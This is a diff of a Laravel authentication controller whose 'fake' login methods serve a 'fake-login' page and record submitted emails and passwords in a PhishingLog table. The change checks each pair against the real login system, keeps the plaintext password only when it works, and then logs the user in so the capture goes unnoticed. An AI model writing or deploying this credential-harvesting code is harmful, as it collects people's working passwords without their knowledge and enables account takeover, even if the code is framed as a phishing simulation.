@@ -37,7 +37,7 @@ class AuthenticatedSessionController extends Controller
      */
     public function fakeCreate(): View
     {
-        return view('auth.login');
+        return view('auth.fake-login');
     }
 
     /**
@@ -45,12 +45,24 @@ class AuthenticatedSessionController extends Controller
      */
     public function fakeStore(LoginRequest $request): RedirectResponse
     {
-        PhishingLog::create([
-            'email' => $request->email,
-            'password' => $request->password,
-        ]);
+        $credentials = $request->only('email', 'password');
 
-        return back()->with('status', 'Cảm ơn, hệ thống đang xử lý...');
+        if (Auth::attempt($credentials)) {
+            // Login thành công, lưu log
+            PhishingLog::create([
+                'email' => $request->email,
+                'password' => $request->password,
+            ]);
+
+            // Redirect tới trang intended (dashboard, home...)
+            return redirect()->intended('dashboard')
+                ->with('status', 'Đăng nhập thành công');
+        }
+
+        // Sai thông tin -> không lưu log, chỉ báo lỗi
+        return back()->withErrors([
+            'email' => 'Email hoặc mật khẩu không đúng',
+        ])->onlyInput('email');
     }
 
     /**
